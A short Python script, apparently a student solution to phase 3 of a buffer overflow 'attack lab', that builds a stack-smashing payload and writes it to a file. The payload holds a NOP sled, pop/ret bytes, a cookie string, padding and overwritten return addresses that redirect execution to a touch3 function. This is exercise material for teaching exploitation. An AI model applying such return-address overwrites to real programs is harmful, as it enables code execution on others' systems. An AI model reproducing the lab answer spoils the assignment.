# Phase 3

import struct

def p64(d):
	return struct.pack('Q', d)

COOKIE = 0x76927bbf

TOUCH = [
	0x00000000004018c8,
	0x00000000004018f4,
	0x00000000004019c9
]
BUFFER_ADDRESS = 0x5566fd78# addr of char buf
OFFSET = 0x28

POP_RDI = '\x5F'
RET_OP  = '\xC3'








exploit = ''
exploit += '\x90' * 10 + POP_RDI#pop (BUFFER_ADDRESS + length + 3) ----> rdi -----> addr of ('CCC76927bbf\x00')
exploit += RET_OP # addr of ('CCC76927bbf\x00')----> touch 3
length = len(exploit)
exploit += 'CCC76927bbf\x00'
exploit += 'A' * (OFFSET - len(exploit))#we're done with exploit, add rest as padding
exploit += p64(BUFFER_ADDRESS)#jump to top of our char buf AKA start of exploit code ----> NOP
exploit += p64(BUFFER_ADDRESS + length + 3)
exploit += p64(TOUCH[2])

# '\x78\xfd\x66\x55\x00'

'''
char * a = 'cookie';
touch3(a)
'''

with open('exploit_3.txt', 'w') as f:
	f.write(exploit)
